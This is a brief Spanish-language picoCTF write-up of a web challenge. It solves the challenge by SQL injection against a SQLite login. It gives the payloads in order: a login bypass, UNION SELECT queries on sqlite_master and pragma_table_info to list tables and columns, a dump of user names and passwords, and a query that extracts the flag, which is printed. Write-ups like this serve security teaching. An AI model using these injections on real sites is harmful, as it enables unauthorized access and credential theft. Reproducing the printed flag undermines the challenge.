## Descripcion
Can you find the flag on this website.

Additional details will be available after launching your challenge instance.

## Pistas 
SQLILITE
****** 
## Solucion
Entrar al sitio
```sqlite
--password :
' OR  '' = '';
```
listar todas las tablas
```sql
' or true union SELECT '1' , '2', tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';

```
obtener nombres de columnas
```sql
' or true union SELECT 1, 2, name FROM pragma_table_info('users');
' or true union SELECT id, name, password FROM users;
--moreRandOMN3ss

' or true union SELECT 1, 2, name FROM pragma_table_info('more_table');
```
conseguir bandera
```sqlite
' or true union SELECT id, flag, 3 FROM more_table;
```
## bandera
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}

## Notas adicionales 

## Referencias